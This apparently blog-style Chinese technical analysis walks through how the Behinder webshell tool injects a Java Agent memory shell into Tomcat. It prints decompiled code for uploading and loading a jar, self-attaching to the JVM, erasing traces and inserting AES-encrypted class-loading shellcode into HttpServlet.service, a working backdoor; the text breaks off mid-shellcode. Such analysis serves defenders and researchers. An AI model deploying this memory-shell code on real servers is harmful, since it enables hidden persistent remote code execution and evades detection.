<h2 id="冰蝎Agent内存马实现分析"><a href="#冰蝎Agent内存马实现分析" class="headerlink" title="冰蝎Agent内存马实现分析"></a>冰蝎Agent内存马实现分析</h2><p>​    上面我们了解了如何通过<code>Java Agent</code>在运行时修改方法内容，下面我们分析下<strong>冰蝎内存马的实现</strong>。</p>
<h3 id="内存马植入流程分析"><a href="#内存马植入流程分析" class="headerlink" title="内存马植入流程分析"></a>内存马植入流程分析</h3><p>​    冰蝎内存马植入的部分主要在<code>injectMemShell</code>中实现，<code>injectMemShell</code>做了如下操作：</p>
<ul>
<li>获取到当前要注入的<code>shell</code>的主机类型</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">		<span class="comment">//获取当前shell的ID并连接</span></span><br><span class="line">	JSONObject shellEntity = <span class="keyword">this</span>.shellManager.findShell(shellID);</span><br><span class="line">          ShellService shellService = <span class="keyword">new</span> ShellService(shellEntity);</span><br><span class="line">          shellService.doConnect();</span><br><span class="line">	<span class="comment">//获取操作系统的信息</span></span><br><span class="line">          String osInfo = shellEntity.getString(<span class="string">&quot;os&quot;</span>);</span><br><span class="line">          <span class="keyword">int</span> osType;</span><br><span class="line">          String libPath;</span><br><span class="line">          <span class="keyword">if</span> (osInfo == <span class="keyword">null</span> || osInfo.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">             osType = (<span class="keyword">new</span> SecureRandom()).nextInt(<span class="number">3000</span>);</span><br><span class="line">             libPath = Utils.getRandomString(osType);</span><br><span class="line">             JSONObject basicInfoObj = <span class="keyword">new</span> JSONObject(shellService.getBasicInfo(libPath));</span><br><span class="line">             osInfo = (<span class="keyword">new</span> String(Base64.decode(basicInfoObj.getString(<span class="string">&quot;osInfo&quot;</span>)), <span class="string">&quot;UTF-8&quot;</span>)).toLowerCase();</span><br><span class="line">          &#125;</span><br><span class="line"><span class="comment">//根据操作系统得到osType，windows则为0</span></span><br><span class="line">          osType = Utils.getOSType(osInfo);</span><br></pre></td></tr></table></figure>

<ul>
<li>根据主机的类型上传不同的jar包到temp目录下,当<code>osType</code>为0表示系统为windows,上传<code>tools_0.jar</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">libPath = Utils.getRandomString(<span class="number">6</span>);</span><br><span class="line">        <span class="keyword">if</span> (osType == Constants.OS_TYPE_WINDOWS) &#123;</span><br><span class="line">           libPath = <span class="string">&quot;c:/windows/temp/&quot;</span> + libPath;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           libPath = <span class="string">&quot;/tmp/&quot;</span> + libPath;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        shellService.uploadFile(libPath, Utils.getResourceData(<span class="string">&quot;net/rebeyond/behinder/resource/tools/tools_&quot;</span> + osType + <span class="string">&quot;.jar&quot;</span>), <span class="keyword">true</span>);</span><br><span class="line"> </span><br><span class="line">        shellService.injectMemShell(type, libPath, path, Utils.getKey(shellEntity.getString(<span class="string">&quot;password&quot;</span>)), isAntiAgent);</span><br><span class="line">     </span><br></pre></td></tr></table></figure>

<ul>
<li>在<code>loadjar</code>中加载<code>Loader</code>类，将传上去的jar通过<code>Url</code>加载</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellService.loadJar(libPath);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> JSONObject <span class="title">loadJar</span><span class="params">(String libPath)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Map params = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line">    params.put(<span class="string">&quot;libPath&quot;</span>, libPath);</span><br><span class="line">    <span class="comment">//获取Loader类字节码并加密后返回</span></span><br><span class="line">    <span class="keyword">byte</span>[] data = Utils.getData(<span class="keyword">this</span>.currentKey, <span class="keyword">this</span>.encryptType, <span class="string">&quot;Loader&quot;</span>, params, <span class="keyword">this</span>.currentType);</span><br><span class="line">    <span class="comment">//发送请求包获取返回结果</span></span><br><span class="line">    Map resultObj = Utils.requestAndParse(<span class="keyword">this</span>.currentUrl, <span class="keyword">this</span>.currentHeaders, data, <span class="keyword">this</span>.beginIndex, <span class="keyword">this</span>.endIndex);</span><br><span class="line">    <span class="keyword">byte</span>[] resData = (<span class="keyword">byte</span>[])((<span class="keyword">byte</span>[])resultObj.get(<span class="string">&quot;data&quot;</span>));</span><br><span class="line">    <span class="comment">//解密返回包获取信息</span></span><br><span class="line">    String resultTxt = <span class="keyword">new</span> String(Crypt.Decrypt(resData, <span class="keyword">this</span>.currentKey, <span class="keyword">this</span>.encryptType, <span class="keyword">this</span>.currentType));</span><br><span class="line">    JSONObject result = <span class="keyword">new</span> JSONObject(resultTxt);</span><br><span class="line">    Iterator var8 = result.keySet().iterator();</span><br><span class="line">    <span class="keyword">while</span>(var8.hasNext()) &#123;</span><br><span class="line">       String key = (String)var8.next();</span><br><span class="line">       result.put(key, (Object)(<span class="keyword">new</span> String(Base64.decode(result.getString(key)), <span class="string">&quot;UTF-8&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>  <code>Loader</code>的<code>equals</code>方法主要代码实现如下,通过<code>URLClassLoader</code>将上传的jar包加载到内存中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">            URL url = (<span class="keyword">new</span> File(libPath)).toURI().toURL();</span><br><span class="line">            URLClassLoader urlClassLoader = (URLClassLoader)ClassLoader.getSystemClassLoader();</span><br><span class="line">            Method add = URLClassLoader.class.getDeclaredMethod(<span class="string">&quot;addURL&quot;</span>, URL.class);</span><br><span class="line">            add.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            add.invoke(urlClassLoader, url);</span><br><span class="line">            result.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;success&quot;</span>);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>injectMemShell</code>中加载了<code>MemShell</code>，而<code>MemShell</code>中完成了内存马加载的核心逻辑。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellService.injectMemShell(type, libPath, path, Utils.getKey(shellEntity.getString(<span class="string">&quot;password&quot;</span>)), isAntiAgent);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> JSONObject <span class="title">injectMemShell</span><span class="params">(String type, String libPath, String path, String password, <span class="keyword">boolean</span> isAntiAgent)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">     Map params = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line">     params.put(<span class="string">&quot;type&quot;</span>, type);</span><br><span class="line">     params.put(<span class="string">&quot;libPath&quot;</span>, libPath);</span><br><span class="line">     params.put(<span class="string">&quot;path&quot;</span>, path);</span><br><span class="line">     params.put(<span class="string">&quot;password&quot;</span>, password);</span><br><span class="line">     params.put(<span class="string">&quot;antiAgent&quot;</span>, isAntiAgent + <span class="string">&quot;&quot;</span>);</span><br><span class="line">     <span class="keyword">byte</span>[] data = Utils.getData(<span class="keyword">this</span>.currentKey, <span class="keyword">this</span>.encryptType, <span class="string">&quot;MemShell&quot;</span>, params, <span class="keyword">this</span>.currentType);</span><br><span class="line">     Map resultObj = Utils.requestAndParse(<span class="keyword">this</span>.currentUrl, <span class="keyword">this</span>.currentHeaders, data, <span class="keyword">this</span>.beginIndex, <span class="keyword">this</span>.endIndex);</span><br><span class="line">     <span class="keyword">byte</span>[] resData = (<span class="keyword">byte</span>[])((<span class="keyword">byte</span>[])resultObj.get(<span class="string">&quot;data&quot;</span>));</span><br><span class="line">     String resultTxt = <span class="keyword">new</span> String(Crypt.Decrypt(resData, <span class="keyword">this</span>.currentKey, <span class="keyword">this</span>.encryptType, <span class="keyword">this</span>.currentType));</span><br><span class="line">     JSONObject result = <span class="keyword">new</span> JSONObject(resultTxt);</span><br><span class="line">     Iterator var12 = result.keySet().iterator();</span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span>(var12.hasNext()) &#123;</span><br><span class="line">        String key = (String)var12.next();</span><br><span class="line">        result.put(key, (Object)(<span class="keyword">new</span> String(Base64.decode(result.getString(key)), <span class="string">&quot;UTF-8&quot;</span>)));</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>MemShell</code>的<code>equals</code>方法中，首先设置了<code>allowAttachSelf</code>并调用了<code>doAgentShell</code>完成内存马种植。</li>
</ul>
<p>为什么设置<code>allowAttachSelf</code> rebeyond前辈在<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10075">Java内存攻击技术漫谈</a>中讲过，在JDK9以上，<code>jdk.attach.allowAttachSelf</code>默认为false,也就是无法Attach，所以才需要设置为true。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">                System.setProperty(<span class="string">&quot;jdk.attach.allowAttachSelf&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.fillContext(obj);</span><br><span class="line">                <span class="keyword">if</span> (type.equals(<span class="string">&quot;Agent&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">this</span>.doAgentShell(Boolean.parseBoolean(antiAgent));</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>doAgentShell</code>首先通过反射获取<code>loadAgent</code>和<code>attach</code>方法并调用，如果是linux则删除生成的临时文件，最后删除上传的<code>jar</code>包。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doAgentShell</span><span class="params">(<span class="keyword">boolean</span> antiAgent)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class VirtualMachineCls = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">            Method attachMethod = VirtualMachineCls.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>, String.class);</span><br><span class="line">            Method loadAgentMethod = VirtualMachineCls.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>, String.class, String.class);</span><br><span class="line">            Object obj = attachMethod.invoke(VirtualMachineCls, getCurrentPID());</span><br><span class="line">            loadAgentMethod.invoke(obj, libPath, base64encode(path) + <span class="string">&quot;|&quot;</span> + base64encode(password));</span><br><span class="line">            String osInfo = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();</span><br><span class="line">            <span class="keyword">if</span> (osInfo.indexOf(<span class="string">&quot;windows&quot;</span>) &lt; <span class="number">0</span> &amp;&amp; osInfo.indexOf(<span class="string">&quot;winnt&quot;</span>) &lt; <span class="number">0</span> &amp;&amp; osInfo.indexOf(<span class="string">&quot;linux&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; antiAgent) &#123;</span><br><span class="line">                String fileName = <span class="string">&quot;/tmp/.java_pid&quot;</span> + getCurrentPID();</span><br><span class="line">                (<span class="keyword">new</span> File(fileName)).delete();</span><br><span class="line">            &#125;</span><br><span class="line">...</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            (<span class="keyword">new</span> File(libPath)).delete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="Agent实现"><a href="#Agent实现" class="headerlink" title="Agent实现"></a>Agent实现</h3><p>​    通过上面的分析我们已经了解了冰蝎<code>Agent</code>注入的流程，并且也了解到<code>Agent</code>的实现主要在<code>tools_0.jar</code>中。</p>
<p>​    在<code>MANIFEST.MF</code>中，可以通过配置得到<code>Agent-Class</code>为<code>MemShell</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Agent-Class: net.rebeyond.behinder.payload.java.MemShell</span><br><span class="line">Can-Redefine-Classes: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<p>​    <code>agentmain</code>方法中为注入内存马的逻辑</p>
<ul>
<li>获取所有已经加载的Class</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt;[] cLasses = inst.getAllLoadedClasses();</span><br></pre></td></tr></table></figure>

<ul>
<li>将<code>HttpServlet</code>的<code>service</code>方法需要的信息封装到<code>Map</code>中，这里应该是不同版本的Tomcat包名发生了改变，所以准备了<code>javax.servlet</code>和<code>jakarta.servlet</code>两个数据包。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Map&lt;String, Object&gt;&gt; targetClasses = <span class="keyword">new</span> HashMap();</span><br><span class="line">     Map&lt;String, Object&gt; targetClassJavaxMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">     targetClassJavaxMap.put(<span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;service&quot;</span>);</span><br><span class="line">     List&lt;String&gt; paramJavaxClsStrList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">     paramJavaxClsStrList.add(<span class="string">&quot;javax.servlet.ServletRequest&quot;</span>);</span><br><span class="line">     paramJavaxClsStrList.add(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>);</span><br><span class="line">     targetClassJavaxMap.put(<span class="string">&quot;paramList&quot;</span>, paramJavaxClsStrList);</span><br><span class="line">     targetClasses.put(<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span>, targetClassJavaxMap);</span><br><span class="line">     Map&lt;String, Object&gt; targetClassJakartaMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">     targetClassJakartaMap.put(<span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;service&quot;</span>);</span><br><span class="line">     List&lt;String&gt; paramJakartaClsStrList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">     paramJakartaClsStrList.add(<span class="string">&quot;jakarta.servlet.ServletRequest&quot;</span>);</span><br><span class="line">     paramJakartaClsStrList.add(<span class="string">&quot;jakarta.servlet.ServletResponse&quot;</span>);</span><br><span class="line">     targetClassJakartaMap.put(<span class="string">&quot;paramList&quot;</span>, paramJakartaClsStrList);</span><br><span class="line">     targetClasses.put(<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span>, targetClassJavaxMap);</span><br><span class="line">     targetClasses.put(<span class="string">&quot;jakarta.servlet.http.HttpServlet&quot;</span>, targetClassJakartaMap);</span><br></pre></td></tr></table></figure>

<ul>
<li>下面是<code>Agent</code>实现的核心代码，判断已经加载的类是否为<code>HttpServlet</code>，如果是则从参数中获取<code>path</code>和<code>key</code>,通过<code>format</code>对<code>shellcode</code>中的占位符替换。通过<code>javasist</code>技术将<code>shellcode</code>插入到<code>HttpServlet.service</code>方法之前，最后通过<code>redefineClasses</code>重新触发类加载。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Class[] var28 = cLasses;</span><br><span class="line"><span class="keyword">int</span> var13 = cLasses.length;       </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> var14 = <span class="number">0</span>; var14 &lt; var13; ++var14) &#123;</span><br><span class="line">            Class&lt;?&gt; cls = var28[var14];</span><br><span class="line">    	<span class="comment">//判断类名是否为HttpServlet</span></span><br><span class="line">            <span class="keyword">if</span> (targetClasses.keySet().contains(cls.getName())) &#123;</span><br><span class="line">                String targetClassName = cls.getName();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//获取path和key，并对shellcode中的占位符替换</span></span><br><span class="line">                    String path = <span class="keyword">new</span> String(base64decode(args.split(<span class="string">&quot;\\|&quot;</span>)[<span class="number">0</span>]));</span><br><span class="line">                    String key = <span class="keyword">new</span> String(base64decode(args.split(<span class="string">&quot;\\|&quot;</span>)[<span class="number">1</span>]));</span><br><span class="line">                    shellCode = String.format(shellCode, path, key);</span><br><span class="line">                    <span class="comment">//判断报名是否为jakarta，如果是则对shellcode中的包名替换</span></span><br><span class="line">                    <span class="keyword">if</span> (targetClassName.equals(<span class="string">&quot;jakarta.servlet.http.HttpServlet&quot;</span>)) &#123;</span><br><span class="line">                        shellCode = shellCode.replace(<span class="string">&quot;javax.servlet&quot;</span>, <span class="string">&quot;jakarta.servlet&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">			<span class="comment">//javasist修改HttpServlet类</span></span><br><span class="line">                    ClassClassPath classPath = <span class="keyword">new</span> ClassClassPath(cls);</span><br><span class="line">                    cPool.insertClassPath(classPath);</span><br><span class="line">                    <span class="comment">//导入包</span></span><br><span class="line">                    cPool.importPackage(<span class="string">&quot;java.lang.reflect.Method&quot;</span>);</span><br><span class="line">                    cPool.importPackage(<span class="string">&quot;javax.crypto.Cipher&quot;</span>);</span><br><span class="line">                    <span class="comment">//获取参数列表</span></span><br><span class="line">                    List&lt;CtClass&gt; paramClsList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">                    Iterator var21 = ((List)((Map)targetClasses.get(targetClassName)).get(<span class="string">&quot;paramList&quot;</span>)).iterator();</span><br><span class="line"></span><br><span class="line">                    String methodName;</span><br><span class="line">                    <span class="keyword">while</span>(var21.hasNext()) &#123;</span><br><span class="line">                        methodName = (String)var21.next();</span><br><span class="line">                        paramClsList.add(cPool.get(methodName));</span><br><span class="line">                    &#125;</span><br><span class="line">                    CtClass cClass = cPool.get(targetClassName);</span><br><span class="line">                    <span class="comment">//获取方法名</span></span><br><span class="line">                    methodName = ((Map)targetClasses.get(targetClassName)).get(<span class="string">&quot;methodName&quot;</span>).toString();</span><br><span class="line">                    CtMethod cMethod = cClass.getDeclaredMethod(methodName, (CtClass[])paramClsList.toArray(<span class="keyword">new</span> CtClass[paramClsList.size()]));</span><br><span class="line">                    <span class="comment">//在方法前插入代码</span></span><br><span class="line">                    cMethod.insertBefore(shellCode);</span><br><span class="line">                    cClass.detach();</span><br><span class="line">                    data = cClass.toBytecode();</span><br><span class="line">                    <span class="comment">//重新加载Class</span></span><br><span class="line">                    inst.redefineClasses(<span class="keyword">new</span> ClassDefinition[]&#123;<span class="keyword">new</span> ClassDefinition(cls, data)&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var24) &#123;</span><br><span class="line">                    var24.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Error var25) &#123;</span><br><span class="line">                    var25.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>shellcode中的内容如下，也就是在执行前首先判断URL是否为内存马的路径，如果是则执行冰蝎马的逻辑，否则执行正常的<code>HttpServlet</code>的逻辑。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">javax.servlet.http.HttpServletRequest request=(javax.servlet.ServletRequest)$<span class="number">1</span>;</span><br><span class="line">javax.servlet.http.HttpServletResponse response = (javax.servlet.ServletResponse)$<span class="number">2</span>;</span><br><span class="line">javax.servlet.http.HttpSession session = request.getSession();</span><br><span class="line">String pathPattern=\<span class="string">&quot;%s\&quot;;</span></span><br><span class="line"><span class="string">if (request.getRequestURI().matches(pathPattern))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	java.util.Map obj=new java.util.HashMap();</span></span><br><span class="line"><span class="string">	obj.put(\&quot;request\&quot;,request);</span></span><br><span class="line"><span class="string">	obj.put(\&quot;response\&quot;,response);</span></span><br><span class="line"><span class="string">	obj.put(\&quot;session\&quot;,session);</span></span><br><span class="line"><span class="string">    ClassLoader loader=this.getClass().getClassLoader();</span></span><br><span class="line"><span class="string">	if (request.getMethod().equals(\&quot;POST\&quot;))</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		try</span></span><br><span class="line"><span class="string">		&#123;</span></span><br><span class="line"><span class="string">			String k=\&quot;%s\&quot;;</span></span><br><span class="line"><span class="string">			session.putValue(\&quot;u\&quot;,k);</span></span><br><span class="line"><span class="string">			java.lang.ClassLoader systemLoader=java.lang.ClassLoader.getSystemClassLoader();</span></span><br><span class="line"><span class="string">			Class cipherCls=systemLoader.loadClass(\&quot;javax.crypto.Cipher\&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">			Object c=cipherCls.getDeclaredMethod(\&quot;getInstance\&quot;,new Class[]&#123;String.class&#125;).invoke((java.lang.Object)cipherCls,new Object[]&#123;\&quot;AES\&quot;&#125;);</span></span><br><span class="line"><span class="string">			Object keyObj=systemLoader.loadClass(\&quot;javax.crypto.spec.SecretKeySpec\&quot;).getDeclaredConstructor(new Class[]&#123;byte[].class,String.class&#125;).newInstance(new Object[]&#123;k.getBytes(),\&quot;AES\&quot;&#125;);;</span></span><br><span class="line"><span class="string">			       </span></span><br><span class="line"><span class="string">			java.lang.reflect.Method initMethod=cipherCls.getDeclaredMethod(\&quot;init\&quot;,new Class[]&#123;int.class,systemLoader.loadClass(\&quot;java.security.Key\&quot;)&#125;);</span></span><br><span class="line"><span class="string">			initMethod.invoke(c,new Object[]&#123;new Integer(2),keyObj&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">			java.lang.reflect.Method doFinalMethod=cipherCls.getDeclaredMethod(\&quot;doFinal\&quot;,new Class[]&#123;byte[].class&#125;);</span></span><br><span class="line"><span class="string">            byte[] requestBody=null;</span></span><br><span class="line"><span class="string">            try &#123;</span></span><br><span class="line"><span class="string">                    Class Base64 = loader.loadClass(\&quot;sun.misc.BASE64Decoder\&quot;);</span></span><br><span class="line"><span class="string">			        Object Decoder = Base64.newInstance();</span></span><br><span class="line"><span class="string">                    requestBody=(byte[]) Decoder.getClass().getMethod(\&quot;decodeBuffer\&quot;, new Class[]&#123;String.class&#125;).invoke(Decoder, new Object[]&#123;request.getReader().readLine()&#125;);</span></span><br><span class="line"><span class="string">                &#125; catch (Exception ex) </span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                    Class Base64 = loader.loadClass(\&quot;java.util.Base64\&quot;);</span></span><br><span class="line"><span class="string">                    Object Decoder = Base64.getDeclaredMethod(\&quot;getDecoder\&quot;,new Class[0]).invoke(null, new Object[0]);</span></span><br><span class="line"><span class="string">                    requestBody=(byte[])Decoder.getClass().getMethod(\&quot;decode\&quot;, new Class[]&#123;String.class&#125;).invoke(Decoder, new Object[]&#123;request.getReader().readLine()&#125;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">						</span></span><br><span class="line"><span class="string">			byte[] buf=(byte[])doFinalMethod.invoke(c,new Object[]&#123;requestBody&#125;);</span></span><br><span class="line"><span class="string">			java.lang.reflect.Method defineMethod=java.lang.ClassLoader.class.getDeclaredMethod(\&quot;defineClass\&quot;, new Class[]&#123;String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class&#125;);</span></span><br><span class="line"><span class="string">			defineMethod.setAccessible(true);</span></span><br><span class="line"><span class="string">			java.lang.reflect.Constructor constructor=java.security.SecureClassLoader.class.getDeclaredConstructor(new Class[]&#123;java.lang.ClassLoader.class&#125;);</span></span><br><span class="line"><span class="string">			constructor.setAccessible(true);</span></span><br><span class="line"><span class="string">			java.lang.ClassLoader cl=(java.lang.ClassLoader)constructor.newInstance(new Object[]&#123;loader&#125;);</span></span><br><span 